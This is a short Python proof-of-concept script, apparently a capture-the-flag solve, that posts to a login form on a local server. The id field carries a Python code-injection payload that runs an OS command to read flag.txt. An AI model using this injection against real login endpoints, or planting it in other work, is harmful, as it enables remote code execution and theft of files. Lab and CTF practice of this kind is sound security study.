import requests

URL = "http://127.0.0.1:26004"

def poc(payload_id, payload_pw):
    data = {"id": payload_id, "pw": payload_pw}
    res = requests.post(URL + "/login", data=data)
    print(f"[*] Trying id={payload_id}, pw={payload_pw}")
    print(res.text)
    

if __name__ == "__main__":
    # Case 1
    poc("__import__('os').popen('cat flag.txt').read()#", "dummy")
